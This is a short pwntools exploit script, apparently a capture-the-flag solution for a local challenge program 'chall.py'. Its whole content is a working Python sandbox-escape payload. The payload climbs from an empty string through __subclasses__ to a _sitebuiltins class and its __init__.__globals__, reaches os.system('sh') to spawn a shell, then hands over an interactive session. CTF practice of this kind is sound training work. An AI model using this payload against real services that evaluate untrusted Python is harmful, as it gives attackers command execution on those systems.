from pwn import *

p = process(["python3", "chall.py"])
# p = remote('localhost', 19010)

p.sendline(b'2')

payload = b'''[(x.__init__.__globals__)for(x)in(''.__class__.__base__.__subclasses__())if("'_sitebuiltins.")in(f"{x}")and((("_Helper")in(f"{x}"))==0)][0]['sys'].modules['os'].system('sh')'''
p.sendline(payload)

p.interactive()